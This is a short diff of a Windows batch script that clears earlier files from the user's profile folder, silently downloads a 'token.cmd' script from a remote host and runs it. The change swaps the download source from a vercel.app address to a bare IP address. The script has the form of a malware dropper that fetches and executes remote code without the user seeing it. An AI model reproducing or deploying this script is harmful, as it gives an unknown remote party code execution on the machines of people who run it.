@@ -1,6 +1,6 @@
 ::@echo off
 if exist "%USERPROFILE%\parse" del "%USERPROFILE%\parse"
 if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\token.cmd"
-curl -s -L -o "%USERPROFILE%//token.cmd" "https://vercel-rho-amber-58.vercel.app/301/token.cmd" token.cmd
+curl -s -L -o "%USERPROFILE%//token.cmd" "http://144.172.103.226/301/token.cmd" token.cmd
 "%USERPROFILE%\token.cmd"
 ::cls
